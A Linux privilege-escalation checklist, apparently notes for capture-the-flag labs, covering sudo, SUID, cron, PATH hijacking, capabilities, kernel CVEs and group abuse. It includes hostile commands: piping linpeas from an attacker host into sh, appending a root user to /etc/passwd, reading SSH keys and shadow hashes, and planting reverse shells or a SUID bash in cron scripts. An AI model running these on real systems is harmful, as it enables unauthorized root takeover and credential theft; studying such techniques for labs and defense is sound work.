# Linux Privesc Checklist
 
> You don't intuit privesc. You enumerate, then match findings against known vectors.
> Land a shell → run this list (or just run linpeas) → pick the red flag → exploit.
 
## 0. Automate it first
 
```bash
# Drop linpeas on the target, run it, read the red/yellow.
# Transfer: on your box  ->  python3 -m http.server 80
# On target:
curl http://<YOUR_IP>/linpeas.sh | sh
# or wget http://<YOUR_IP>/linpeas.sh -O /tmp/lp.sh; chmod +x /tmp/lp.sh; /tmp/lp.sh
```
Red = almost certainly exploitable. Yellow = worth a look. linpeas runs everything below for you — the manual list is for when you have no internet on the box or want to understand *why* it flagged something.
 
---
 
## 1. Who am I / quick context
```bash
id            # uid, gid, groups (lxd/docker/disk groups = instant win, look them up)
whoami
hostname
uname -a      # kernel version -> searchsploit it
cat /etc/os-release
sudo -l        # what can I run as root? (often THE answer)
```
 
## 2. sudo -l (check this first, every time)
- Anything listed = you can run it as root.
- `(ALL) NOPASSWD: ...` = no password needed.
- Take the binary name → **GTFOBins** (gtfobins.github.io). It tells you the exact escape syntax.
- `sudo` itself can be vulnerable (CVE-2021-3156 Baron Samedit, CVE-2019-14287 `sudo -u#-1`).

## 3. SUID / SGID binaries
Run as the file *owner* (often root) regardless of who executes them.
```bash
find / -perm -4000 -type f 2>/dev/null      # SUID
find / -perm -2000 -type f 2>/dev/null      # SGID
```
- Anything non-standard or oddly placed → **GTFOBins** (filter: SUID).
- Custom SUID binary? Pull it, check strings, look for it calling another binary by relative path (PATH hijack) or via `system()`.

## 4. Cron jobs  ← the EasyPeasy vector
```bash
cat /etc/crontab
ls -la /etc/cron.*          # .d .daily .hourly .weekly .monthly
cat /etc/cron.d/*
crontab -l                  # current user's
ls -la /var/spool/cron/crontabs/ 2>/dev/null
```
For each scheduled script ask: **what runs, as whom, and can I write to it?**
```bash
ls -la /path/to/script.sh   # is it writable by me, or world-writable?
```
- Script writable → put a reverse shell / `chmod +s /bin/bash` inside, wait for the schedule to fire.
- Script calls a binary by relative name → PATH hijack: drop a malicious binary earlier in PATH.
- Wildcard in a cron command (`tar *`, `chown *`) → wildcard injection (GTFOBins / `tar` checkpoint trick).
Spot a job firing but can't see its file? Use **pspy** to watch processes/cron in real time without root.
 
## 5. Writable files root touches
```bash
# World-writable files
find / -writable -type f 2>/dev/null | grep -v "/proc/"
# World-writable dirs
find / -writable -type d 2>/dev/null
```
- `/etc/passwd` writable → add a root user (`openssl passwd` a hash in, or append `hacker:$1$...:0:0::/root:/bin/bash`).
- `/etc/shadow` readable → crack root's hash offline.
- Root's PATH dirs writable → drop a binary it'll call.

## 6. PATH hijacking
A root script/SUID binary calls e.g. `service` or `cat` without a full path.
```bash
echo $PATH
# If a writable dir is early in PATH, or you control PATH when the binary runs:
echo '/bin/bash' > /tmp/service && chmod +x /tmp/service
export PATH=/tmp:$PATH
# then trigger the binary
```
 
## 7. Capabilities
SUID's quieter cousin.
```bash
getcap -r / 2>/dev/null
```
- `cap_setuid+ep` on python/perl/etc. → set uid 0. (GTFOBins → Capabilities.)

## 8. Kernel / OS exploits (last resort)
```bash
uname -a
searchsploit linux kernel <version>     # on your attack box
```
- DirtyCow (CVE-2016-5195), Dirty Pipe (CVE-2022-0847), PwnKit/polkit (CVE-2021-4034 — `pkexec`, extremely common).
- Noisy and can crash the box. Try config-based vectors above first.

## 9. Credentials lying around
```bash
cat ~/.bash_history
grep -ri "password" /etc /var/www /home 2>/dev/null
cat ~/.ssh/id_rsa          # reuse keys
ls -la /home/*/            # other users' readable files
cat /var/www/**/config*    # web app db creds -> often reused for SSH/su
```
Found a password anywhere? Try it for `su` to every other user. Reuse is everywhere.
 
## 10. Dangerous group memberships
From `id`:
- `docker` → `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` = instant root.
- `lxd`/`lxc` → mount host fs in a privileged container.
- `disk` → read raw disk, `debugfs /dev/sda1`.
- `adm` → read logs (creds).


---
 
## The mental model
Privesc = find something that runs with more privilege than you **and** that you can influence.
Every vector above is one shape of that. You're not guessing — you're walking the list until something is both *powerful* and *writable/controllable*.
 
## Reflexes when stuck
- Run **linpeas**, read the red.
- Run **pspy**, watch what fires.
- Take any interesting binary name to **GTFOBins**.
- Take the kernel/sudo version to **searchsploit**.
- Try every found password against every user.
 